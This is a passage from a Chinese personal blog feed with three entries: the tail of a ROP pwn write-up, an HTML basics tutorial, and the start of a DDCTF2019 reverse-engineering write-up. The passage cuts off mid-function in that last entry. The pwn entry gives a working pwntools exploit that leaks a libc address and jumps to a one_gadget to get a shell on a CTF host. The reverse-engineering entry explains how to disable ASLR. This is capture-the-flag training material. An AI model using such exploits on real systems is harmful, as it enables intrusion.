title="查保护和arch"></a>查保护和arch</h3><pre><code> Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="/2020/02/03/ROP练习/images/15814340991655.jpg" srcset="/img/loading.gif" alt="-w601"><br>主函数十分简单，漏洞在vuln函数：<br><img src="/2020/02/03/ROP练习/images/15814341281175.jpg" srcset="/img/loading.gif" alt="-w389"><br>padding为 6c+4 个字节。跟上题很像的攻击思路，直接给exp了。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *from LibcSearcher import *# io = process(&#39;./bof&#39;)io = remote(&#39;node3.buuoj.cn&#39;,27178)elf = ELF(&#39;./bof&#39;)libc = elf.libccontext.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;padding = 112start_add = 0x080483E0libc_start_main_got = elf.got[&#39;__libc_start_main&#39;]write_plt = elf.symbols[&#39;write&#39;]io.recvuntil(&#39;2015~!\n&#39;)p = padding * &#39;\x00&#39; + flat([write_plt,start_add,1,libc_start_main_got,0x10])io.sendline(p)libc_start_main_add = u32(io.recv(4))obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add)libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;)print(hex(libc_start_main_add))print(hex(libc_base))io.recvuntil(&#39;2015~!\n&#39;)rce = libc_base + 0x3a80cp = padding * &#39;\x00&#39; + p32(rce) + padding * &#39;\x00&#39;io.sendline(p)io.interactive()</code></pre><p>还是本地来base库查libc的one_gadget，然后ret to rce。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>ROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML 基础</title>
    <link href="/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2019/12/29/HTML%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="HTML-基础"><a href="#HTML-基础" class="headerlink" title="HTML 基础"></a>HTML 基础</h2><ol><li><strong>HTML标题</strong>：是通过 <code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的.；其会因为数字变化而显示的字体大小变化；</li><li><strong>HTML段落</strong>：通过标签<code>&lt;p&gt;</code> 来定义的.</li><li><strong>HTML链接</strong>：通过标签<code>&lt;a&gt;</code>来定义的。</li><li><strong>HTML图像</strong>：通过标签 <code>&lt;img&gt;</code> 来定义的。</li></ol><h2 id="HTML-文本"><a href="#HTML-文本" class="headerlink" title="HTML 文本"></a>HTML 文本</h2><h4 id="HTML-标题"><a href="#HTML-标题" class="headerlink" title="HTML 标题"></a>HTML 标题</h4><p>标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签进行定义的.<code>&lt;h1&gt;</code> 定义最大的标题。 <code>&lt;h6&gt;</code>定义最小的标题。<strong>浏览器会自动地在标题的前后添加空行。</strong></p><ul><li><p>标题很重要：</p><p>不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题，而是==为了用户可以通过标题来快速浏览您的网页应该将 h1 用作主标题==（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p></li></ul><h4 id="HTML-注释"><a href="#HTML-注释" class="headerlink" title="HTML 注释"></a>HTML 注释</h4><p><strong>注释</strong>： 开始括号之后（左边的括号）需要紧跟一个叹号，结束括号之前（右边的括号）不需要，合理地使用注释可以对未来的代码编辑工作产生帮助。。</p><pre><code class="html">&lt;!-- 这是一个注释 --&gt;</code></pre><h4 id="HTML-段落"><a href="#HTML-段落" class="headerlink" title="HTML 段落"></a>HTML 段落</h4><p>浏览器会自动地在段落的前后添加空行。<strong>（<code>&lt;/p&gt;</code>是块级元素）</strong></p><h4 id="HTML-水平线"><a href="#HTML-水平线" class="headerlink" title="HTML 水平线"></a>HTML 水平线</h4><p>1：<code>&lt;hr&gt;</code>标签在 HTML 页面中创建水平线。</p><h4 id="HTML-文本格式化"><a href="#HTML-文本格式化" class="headerlink" title="HTML 文本格式化"></a>HTML 文本格式化</h4><p>通常用到<code>&lt;strong&gt;&lt;em&gt;&lt;del&gt;</code>这几个标签。</p><h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;文本&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- &lt;h1&gt;标题1&lt;/h1&gt;    &lt;h2&gt;标题2&lt;/h2&gt;    &lt;h3&gt;标题3&lt;/h3&gt;    &lt;h4&gt;标题4&lt;/h4&gt;    &lt;h5&gt;标题5&lt;/h5&gt;    &lt;h6&gt;标题6&lt;/h6&gt; --&gt;    &lt;!-- &lt;h&gt;标签有大小之分 --&gt;        &lt;h2&gt;五花山&lt;/h2&gt;        &lt;p&gt;我家住在大山里。你知道这里的山是什么颜色的吗？&lt;/p&gt;        &lt;p&gt;春天的山是绿色的，那绿色淡淡的，许多树叶刚冒出芽来，还带着嫩嫩的黄色呢。&lt;/p&gt;        &lt;p&gt;夏天的山也是绿色的，那绿色浓浓的，一片片树叶，不管是大的还是小的，都像被绿油彩涂过，连雨点落上去，都给染绿了。&lt;/p&gt;        &lt;p&gt;秋天的山不再是一种颜色了。下过一场秋霜有的树林变成了金黄色□好像所有的阳光都集中到那儿去了有的树林变成了杏黄色远远望去，就像枝头挂满了熟透的杏和梨；有的树林变成了火红色，风一吹，树林跳起舞来，就像一簇簇火苗在跳跃；还有的树林变得紫红紫红，跟剧场里的紫绒幕布的颜色一样。只有松柏不怕秋霜，针一样的叶子还是那么翠绿。&lt;/p&gt;        &lt;p&gt;秋天的山一片金黄，一片火红，一片翠绿……人们给这五颜六色的山起了个好听的名字，叫“&lt;strong&gt;&lt;em&gt; &lt;del&gt;五花山&lt;/del&gt;&lt;/em&gt;&lt;/strong&gt;”。&lt;/p&gt;  &lt;!-- 几个标签的嵌套 --&gt;         &lt;strong&gt;加粗&lt;/strong&gt; &lt;em&gt;斜体&lt;/em&gt; &lt;del&gt;删除文字&lt;/del&gt;&lt;!-- &lt;span&gt;配合css&lt;/span&gt; --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/wenben.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-图像"><a href="#HTML-图像" class="headerlink" title="HTML 图像"></a>HTML 图像</h2><p> ==<strong>HTML 图像-</strong>== ：</p><ol><li>标签（ <code>&lt;img&gt;</code>）是空标签，意思是说，它只包含属性，并且没有闭合标签。</li><li>源属性（<code>&lt;src&gt;</code>）是图像的 URL 地址。分为本地和网上，本地图片写路径的时候注意<strong>绝对路径和相对路径</strong>（可以用<code>../</code>来返回 一级目录，返回几级目录就写几个它就行)。</li><li>Alt属性:alt 属性用来为图像定义一串预备的可替换的文本,在浏览器无法载入图像时,告用户图片的信息。<strong>==搜索引擎也是通过此描述来收集图片的==</strong>.</li><li>高度与宽度:height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素px。</li></ol><p>练习：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;图片&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;chumen的qq图像&quot; title=&quot;chumen的qq图像&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="图片的映射"><a href="#图片的映射" class="headerlink" title="图片的映射"></a>图片的映射</h4><p>目标是为了在一张图片上的<strong>某个位置</strong>点击后<strong>才</strong>可以实现某个功能。</p><p>这需要用到<code>usemap=&quot;#diyname&quot;</code> 然后用<code>&lt;map name=&quot;diyname&quot;&gt;&lt;/map&gt;</code>标签来对应。</p><p>核心代码：`<map name="1map"></map></p><pre><code>    &lt;area shape=&quot;&quot; coords=&quot;&quot; href=&quot;&quot;&gt;</code></pre><p>\\`</p><p>shape是选择的形状，coords是坐标，坐标确定<strong>推荐用qq的截图功能那里来确定</strong>，比如：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/quzuobiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>那这个彩色箭头指的位置就是在这个图像的（233,456）位置。</p><p><strong>练习：</strong></p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;图片的映射&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;1.png&quot; alt=&quot;&quot; usemap=&quot;#1map&quot;&gt;    &lt;map name=&quot;1map&quot;&gt;        &lt;area shape=&quot;circle&quot; coords=&quot;300,255,50&quot; target=&quot;_blank&quot; href=&quot;http://www.baidu.com&quot;&gt;    &lt;/map&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>效果</strong>：<img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/yingshe.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-超链接"><a href="#HTML-超链接" class="headerlink" title="HTML 超链接"></a>HTML 超链接</h2><p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。使用标签 <code>&lt;a&gt;</code>来设置超文本链接。</p><ul><li><p><strong>HTML 链接语法</strong>:<code>&lt;a href=&quot;url&quot;&gt;链接文本&lt;/a&gt;</code>  ,href 属性描述了链接的目标。</p></li><li><p><strong>target 属性</strong>  :<code>target=&quot;_blank&quot;</code>效果就是在新窗口（空白界面）做出来 。</p></li><li><p><strong>id 属性</strong>:id属性可用于创建在一个HTML文档书签标记,在HTML文档中插入ID:</p><p><code>&lt;a id=&quot;tips&quot;&gt;有用的提示部分&lt;/a&gt;</code> </p><p>在HTML文档中创建一个链接到”有用的提示部分(id=”tips”）”:</p><p><code>&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;</code></p></li></ul><p><strong>解释加补充</strong>：ID 属性名字只能有一个不可重复，且必须以==字母==开头，可以在一个界面的任何位置的内容进行设置ID，在设置完后，（<code>&lt;a href=&quot;# &quot;&gt;</code>），在==“#”==后加入id的名称即可跳转到你设置ID的内容处。</p><p><code>&lt;a name=&quot;end&quot;&gt;&lt;/a&gt;</code> <code>&lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;</code>    <strong>做锚点时，替换id的方法，作用可以实现一样！id不好用时用这个</strong></p><p><strong>练习：</strong>（为了方便阅读，省略了很多的<code>&lt;br&gt;</code>.）</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;超级链接&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;a href=&quot;http://www.mi.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;1.png&quot;&gt;&lt;/a&gt;    &lt;!-- /*书签标记：锚点*/ --&gt;    &lt;a href=&quot;#end&quot;&gt;end&lt;/a&gt;&lt;br id=&quot;aa&quot;&gt;&lt;br&gt;&lt;br id=&quot;miao&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a name=&quot;miao&quot;&gt;&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;a name=&quot;end&quot;&gt;&lt;/a&gt;  &lt;a href=&quot;#miao&quot;&gt;miao&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h2><ul><li><strong>HTML无序列表</strong>：<code>&lt;ul&gt;</code>与 <code>&lt;li&gt;</code>其点的样式(圆圈，圆心，正方形）用<strong>css</strong>来控制<code>&lt;ul style=&quot;list-style-type:circle&quot;&gt;</code></li><li><strong>HTML 有序列表</strong> <code>&lt;ol&gt;</code>与<code>&lt;li&gt;</code>   用法和无序相似，<strong>且有序与无序之间可以互相嵌套</strong>，<strong>嵌套过程中点的形状也会自动变化。</strong></li><li><strong>HTML 自定义列表</strong>：这个是比较常用的，自定义列表以<code>&lt;dl&gt;</code> 标签开始。每个自定义列表项以 <code>&lt;dt&gt;</code> 开始。每个自定义列表项的定义以 <code>&lt;dd&gt;</code>开始。其<strong>不仅仅是一列项目，而是项目及其注释的组合。</strong></li></ul><pre><code class="html">&lt;dl&gt;&lt;dt&gt;Coffee&lt;/dt&gt;    &lt;!-- 列表标题 --&gt;&lt;dd&gt;- black hot drink&lt;/dd&gt;   &lt;!-- 其内容 --&gt;&lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;- white cold drink&lt;/dd&gt;&lt;/dl&gt;</code></pre><p><strong>练习：</strong></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;列表&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;ul style=&quot;list-style-type:circle&quot;&gt;        &lt;li&gt;无序列表1&lt;/li&gt;        &lt;li&gt;无序列表2&lt;/li&gt;        &lt;li&gt;无序列表3&lt;/li&gt;        &lt;li&gt;无序列表4&lt;/li&gt;    &lt;/ul&gt;    &lt;ol&gt;        &lt;li&gt;有序列表1&lt;/li&gt;        &lt;li&gt;有序列表2&lt;/li&gt;        &lt;li&gt;有序列表3&lt;/li&gt;        &lt;li&gt;有序列表4&lt;/li&gt;    &lt;/ol&gt;    &lt;dl&gt;        &lt;dt&gt;标题1&lt;/dt&gt;        &lt;dd&gt;自定义列表1&lt;/dd&gt;        &lt;dd&gt;自定义列表2&lt;/dd&gt;        &lt;dd&gt;自定义列表3&lt;/dd&gt;        &lt;dd&gt;自定义列表4&lt;/dd&gt;        &lt;dt&gt;标题2&lt;/dt&gt;        &lt;dd&gt;自定义列表1&lt;/dd&gt;        &lt;dd&gt;自定义列表2&lt;/dd&gt;        &lt;dd&gt;自定义列表3&lt;/dd&gt;        &lt;dd&gt;自定义列表4&lt;/dd&gt;    &lt;/dl&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/liebiao.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML表格"><a href="#HTML表格" class="headerlink" title="HTML表格"></a>HTML表格</h2><ul><li><p><strong>HTML 表格</strong>：表格由 <code>&lt;table&gt;</code>标签来定义。每个表格均有若干==行==（由 <code>&lt;tr&gt;</code> 标签定义），每行被分割为若干==单元格==（由 <code>&lt;td&gt;</code> 标签定义）。字母 td 指<strong>表格数据</strong>（table data），即数<strong>据单元格的内容</strong>。数据单元格可以包含<strong>文本、图片、列表、段落、表单、水平线、表格</strong>等等。这个有利于多样化，在分清栏目后在td里放内容就ok。</p></li><li><p><strong>HTML 边框属性</strong>:<code>&lt;table border=&quot;1&quot;&gt;</code>会出现表框。</p></li><li><p><strong>HTML 表格表头</strong>:表格的表头使用 <code>&lt;th&gt;</code> 标签进行定义。<code>&lt;th&gt;</code>标签与<code>&lt;td&gt;</code>标签<strong>用法相似只是显示的效果不同，会有粗体居中的效果；</strong></p></li><li><p><strong>HTML表格合并</strong>：用 <strong>colspan</strong>： 横向行  <strong>rowspan</strong>  ：竖纵行。</p></li><li><p><strong>HTML表格单元格边距的设置</strong>：类似 <strong>设置边框</strong> 直接在table标签里放入<strong>cellpadding=“自定义的数字”</strong>，就设置好了。</p></li></ul><p><strong>练习：</strong></p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;表格&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;table border=&quot;1&quot;&gt;         &lt;tr&gt;           &lt;th&gt;部门&lt;/th&gt;           &lt;th&gt;姓名&lt;/th&gt;           &lt;th&gt;性别&lt;/th&gt;           &lt;th&gt;工资&lt;/th&gt;         &lt;/tr&gt;         &lt;tr&gt;             &lt;td rowspan=&quot;3&quot;&gt;开发组&lt;/td&gt;             &lt;td&gt;小明&lt;/td&gt;             &lt;td&gt;男&lt;/td&gt;             &lt;td&gt;1w&lt;/td&gt;         &lt;/tr&gt;         &lt;tr&gt;             &lt;td&gt;小白&lt;/td&gt;             &lt;td&gt;女&lt;/td&gt;             &lt;td&gt;1w&lt;/td&gt;         &lt;/tr&gt;         &lt;tr&gt;         &lt;td colspan=&quot;2&quot;&gt;工资合计&lt;/td&gt;         &lt;td&gt;2w&lt;/td&gt;         &lt;/tr&gt;    &lt;/table&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>效果：</strong></p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaoge.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML-表单"><a href="#HTML-表单" class="headerlink" title="HTML 表单"></a>HTML 表单</h2><p>表单是一个包含<strong>表单元素</strong>的区域。表单元素是允许用户在表单中输入内容,比如：文本域(textarea)、下拉列表、单选框(radio-buttons)、复选框(checkboxes)等等。</p><p>`<form><br>input元素</form></p>\\\\\`<h4 id="HTML-表单-输入元素"><a href="#HTML-表单-输入元素" class="headerlink" title="HTML 表单 - 输入元素"></a>HTML 表单 - 输入元素</h4><p>输入标签<code>&lt;input&gt;</code>。</p><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a>文本域</h4><p>文本域通过<code>&lt;input type=&quot;text&quot;&gt;</code> 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><p>`<form><br>First name: <input type="text" name="firstname"><br><br>Last name: <input type="text" name="lastname"></form></p>\\\\\`<p><strong>在大多数浏览器中，文本域的缺省宽度是20个字符。</strong></p><h4 id="密码字段"><a href="#密码字段" class="headerlink" title="密码字段"></a>密码字段</h4><p><code>&lt;input type=&quot;password&quot;&gt;</code> 来定义</p><pre><code class="html">&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;</code></pre><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p><code>&lt;input type=&quot;radio&quot;&gt;</code> 标签定义了表单单选框选项。</p><pre><code class="html">&lt;form&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;Male&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot;value=&quot;female&quot;&gt;Female&lt;/form&gt;</code></pre><p><strong>Name 是可以进行==分组==。想要有效果 value也少不了。</strong></p><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h4><p><code>&lt;input type=&quot;checkbox&quot;&gt;</code>定义了复选框. 用户需要从若干给定的选择中选取一个或若干选项。</p><pre><code class="html">&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;I have a bike&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;I have a car &lt;/form&gt;</code></pre><p><strong>类似单选三者缺一不可。</strong></p><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a>提交按钮</h4><p><code>&lt;input type=&quot;submit&quot;&gt;</code>定义了提交按钮. </p><pre><code class="html">&lt;form name=&quot;input&quot; action=&quot;&quot; method=&quot;&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;</code></pre><p>==value：提交数据到服务器的值（后台程序PHP使用）写按钮时一定要写上。   name：为控件命名，以备后台程序 ASP、PHP 使用==</p><h4 id="练习：-1"><a href="#练习：-1" class="headerlink" title="练习："></a>练习：</h4><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;表单&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;&quot;&gt; &lt;!-- action 中值为提交的网页 --&gt;&lt;!-- 默认为get --&gt;        admin&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;        password&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;        &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;male&quot;&gt;男 &lt;br&gt;        &lt;input type=&quot;radio&quot; name=&quot;sex1&quot; value=&quot;female&quot;&gt;女          &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;中性&lt;!-- name中值一样那么其分组就一样 --&gt;        &lt;!-- &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;男        &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;女        &lt;input type=&quot;radio&quot; name=&quot;sex&quot;&gt;中性 --&gt;        &lt;br&gt;        &lt;!-- 兴趣复选框 --&gt;        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;kanshu&quot;&gt; 看书        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;xuexi&quot;&gt;  学习        &lt;input type=&quot;checkbox&quot; name=&quot;xq&quot; value=&quot;music&quot;&gt;  听歌        &lt;br&gt;    城市&lt;select name=&quot;city&quot;&gt;            &lt;option value=&quot;shanghai&quot;&gt;上海&lt;/option&gt;            &lt;option value=&quot;beijing&quot;&gt;北京&lt;/option&gt;        &lt;/select&gt;        &lt;input type=&quot;submit&quot; name=&quot;&quot;&gt;&lt;br&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>效果：</p><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/tuchuang/biaodan.jpg?raw=true" srcset="/img/loading.gif" alt></p><h2 id="HTML布局"><a href="#HTML布局" class="headerlink" title="HTML布局"></a>HTML布局</h2><p><strong>HTML 布局 - 使用<code>&lt;div&gt;</code> 元素.</strong></p><p>可以先分为头部div 底部div 和中间的div，然后逐步添加标签进行扩充，用<strong>css</strong>来设置样式。</p><p>这中间需要用到float：left等 来控制一个div中套用的div的位置。</p><ul><li>HTML中<code>&lt;div&gt;</code>元素是块级元素，它可用于组合其他 HTML元素的容器。</li><li><code>&lt;div&gt;</code> 元素的另一个常见的用途是文档布局。<code>&lt;div&gt;</code>元素经常与 <strong>CSS</strong> 一起使用，用来布局网页。</li><li><code>&lt;div&gt;</code> 元素没有特定的含义。</li></ul><p><strong>练习：</strong></p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;布局&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;!-- &lt;div style=&quot;background: yellow; width: 50px;&quot;&gt;        这是个div这是个div这是个div这是个div    &lt;/div&gt; --&gt;    &lt;div style=&quot;background: yellow;height: 100px;&quot;&gt;导航&lt;/div&gt;    &lt;div style=&quot;background: green;width: 20%; float: left; height: 300px;&quot;&gt;菜单&lt;/div&gt;    &lt;di+v style=&quot;background: red;width: 80%; float: left;height: 300px;&quot;&gt;内容&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h2 id="HTML嵌套规则"><a href="#HTML嵌套规则" class="headerlink" title="HTML嵌套规则"></a>HTML嵌套规则</h2><h4 id="元素分类："><a href="#元素分类：" class="headerlink" title="元素分类："></a>元素分类：</h4><ul><li><strong>文字类块元素</strong>：p  h1~h6</li><li><strong>容器类块元素</strong>：div table tr td th form ul li ol dl dt dd</li><li><strong>行元素</strong>:不独立成行，不可以  内容决定a img input strong em del span</li><li><strong>特殊字符</strong>:br </li></ul><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><ul><li>块元素可以嵌套行元素 <code>&lt;div&gt;这是div &lt;a href=&quot;&quot;&gt;这是a&lt;/a&gt; &lt;/div&gt;</code></li><li>行元素可以嵌套行元素 <code>&lt;a href=&quot;&quot;&gt;这是个&lt;strong〉 a&lt;/strong&gt;</code></li><li>行元素不可以嵌套块元素</li><li>文字类抉元素不可以嵌套块元素</li><li>容器类抉元素可以嵌套块元素</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDCTF2019-RE-Windows Reverse</title>
    <link href="/2019/11/17/DDCTF2019-RE-Windows%20Reverse/"/>
    <url>/2019/11/17/DDCTF2019-RE-Windows%20Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-RE-Windows-Reverse"><a href="#DDCTF2019-RE-Windows-Reverse" class="headerlink" title="DDCTF2019-RE-Windows Reverse"></a>DDCTF2019-RE-Windows Reverse</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在一个论坛里发现DDCTF这两道逆向题不是很难，就想着做一下练练手。因为最近做的都是比较老的题目，这个还算新一点的。题目下载：<br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse1_final.zip" target="_blank">reverse1_final.zip</a><br><a href="https://raw.githubusercontent.com/chumen77/chumen77.github.io/master/2019/11/17/DDCTF2019-RE-Windows Reverse/reverse2_final.exe.zip" target="_blank">reverse2_final.exe.zip</a></p><h2 id="reverse1-final-exe"><a href="#reverse1-final-exe" class="headerlink" title="reverse1_final.exe"></a>reverse1_final.exe</h2><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739838372961.jpg" srcset="/img/loading.gif" alt="-w539"><br>可以看出是UPX壳。<br>另外：</p><pre><code> /Volumes/data/ctf逆向题目/2019ddctf  file reverse1_final.exereverse1_final.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed</code></pre><p>在mac终端也可以用file命令查出。</p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>直接在终端UPX -d 脱了就可以了。</p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><p>发现直接是运行不了的，想到是不是因为脱壳后这个需要资源修复，各种操作修复后发现还是不可以。最后查询他人wp发现这个程序开启了<strong>ASLR</strong>。需要pe工具去关闭这个程序的ASLR。然后我就去查了ASLR是怎么关闭的，且其是什么东西。</p><h4 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h4><p>ASLR通过随机放置进程关键数据区域的地址空间来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行Return-to-libc攻击。 –百度百科<br>随后又查询到win7以后的windows系统都是有这个机制的，<strong>但因为有它的存在每次od载入时，其映像基址都是会变化的，而你有时候需要计算一些地址，基址老是变</strong>。以前我是不知道这个的，知道以后感觉这个是更加利于对程序的分析，就想着直接关闭windows7的ASLR。</p><h4 id="关闭ASLR"><a href="#关闭ASLR" class="headerlink" title="关闭ASLR"></a>关闭ASLR</h4><p>有两种办法。</p><h5 id="改注册表"><a href="#改注册表" class="headerlink" title="改注册表"></a>改注册表</h5><p><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739848952944.jpg" srcset="/img/loading.gif" alt="-w901"><br>注册表添加了一个DWORD键值项，其值为0。注意其名称和路径。</p><h5 id="软件关闭"><a href="#软件关闭" class="headerlink" title="软件关闭"></a>软件关闭</h5><p>下载EMET：<a href="https://www.updatestar.com/directdownload/emet/2258274" target="_blank" rel="noopener">https://www.updatestar.com/directdownload/emet/2258274</a><br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739850550859.jpg" srcset="/img/loading.gif" alt="-w730"><br>关闭后重启即可。</p><h4 id="成功运行"><a href="#成功运行" class="headerlink" title="成功运行"></a>成功运行</h4><p>程序成功运行后发现：<br><img src="/2019/11/17/DDCTF2019-RE-Windows Reverse/images/15739851761277.jpg" srcset="/img/loading.gif" alt="-w499"><br>这个估计又是字符对比。用IDA打开分析其逻辑。</p><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><pre><code>int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [esp+4h] [ebp-804h]  char v5; // [esp+5h] [ebp-803h]  char v6; // [esp+404h] [ebp-404h]  char Dst; // [esp+405h] [ebp-403h]  v6 = 0;  memset(&amp;Dst, 0, 0x3FFu);  v4 = 0;  memset(&amp;v5, 0, 0x3FFu);  printf(&quot;please input code:&quot;);  scanf(&quot;%s&quot;, &amp;v6);  sub_401000(&amp;v6);  if ( !strcmp(&amp;v4, &quot;DDCTF{reverseME}&quot;) )    printf(&quot;You&#39;ve got it!!%s\n&quot;, &amp;v4);  else    printf(&quot;Try again later.\n&quot;);  return 0;}</code></pre><p>代码很简单，可以看出来是在接受输入后，经过sub_401000函数分处理后与DDCTF{reverseME}对比，正确就输出You’ve got it!。</p><h4 id="处理函数sub-401000"><a href="#处理函数sub-401000" class="headerlink" title="处理函数sub_401000"></a>处理函数sub_401000</h4><pre><code>unsigned int __cdecl sub_401000(const char *a1){  _BYTE *v1; // ecx  unsigned int i; // 